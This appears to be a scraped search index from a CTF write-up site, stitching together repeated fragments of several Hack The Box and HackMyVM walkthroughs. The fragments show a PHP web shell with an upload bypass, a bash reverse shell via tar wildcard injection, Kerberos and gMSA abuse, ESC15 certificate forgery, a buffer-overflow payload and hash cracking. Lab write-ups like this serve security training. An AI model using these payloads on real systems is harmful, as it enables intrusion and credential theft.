-p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

This time we upload any valid image and then click Transform Image (for example, “crop”), intercepting that request in Burp Suite.\nThe next step is to inject a Reverse Shell into a field that should only contain numbers, so the server executes it and gives us remote access.\nPrivilege escalation to Mark Now that we’re in as the user web, the next step is to run LinPEAS to search for escalation vectors: SUID/weak permissions, credentials in files, misconfigured services, and scheduled tasks we can abuse.\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We find an encrypted backup that could contain credentials or sensitive data from what appears to be the website.\nWe bring it to our local machine and see it was encrypted using pyAesCrypt.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

This time we upload any valid image and then click Transform Image (for example, “crop”), intercepting that request in Burp Suite.\nThe next step is to inject a Reverse Shell into a field that should only contain numbers, so the server executes it and gives us remote access.\nPrivilege escalation to Mark Now that we’re in as the user web, the next step is to run LinPEAS to search for escalation vectors: SUID/weak permissions, credentials in files, misconfigured services, and scheduled tasks we can abuse.\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We find an encrypted backup that could contain credentials or sensitive data from what appears to be the website.\nWe bring it to our local machine and see it was encrypted using pyAesCrypt. To decrypt it we use pyAesDecrypt, which allows a dictionary attack to find the password.\nWe decompress the file and inside find the website backup. When we read db.json this time, it also contains the encrypted password for user mark, so we again use hashcat to crack it.\n","permalink":"http://localhost:1313/writeups/medium/imagery/","summary":"Difficulty: Medium 🟠","title":"Imagery - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/immortal/","summary":"Difficulty: Medium 🟠","title":"Immortal - HackMyVM"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/very-easy/injection/","summary":"Difficulty: Very Easy 🔵","title":"Injection - Dockerlabs"},{"content":"\rMachine Link\nTo find the IP of the victim machine, I use the arp-scan command to discover the devices connected to my local network and locate the one whose** MAC address** starts with 08:, indicating it is a VirtualBox virtual machine.\nsudo arp-scan -I eth0 --localnet Next, we proceed with a quick scan using NMAP to see which ports are open.\nsudo nmap -sS --min-rate 4500 -n -Pn 192.168.18.163 Ports 22 and 80 are open\rAnd now we perform a more detailed scan on those open ports and save the result in a file called target.txt.\nnmap -sCV -p22,80 -n -Pn 192.168.18.163 -oN target.txt Detailed scan of the open ports\rWe observe a website hosted on this machine via port 80, but only the default Nginx homepage is visible.\nI use Gobuster to enumerate hidden files and directories.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

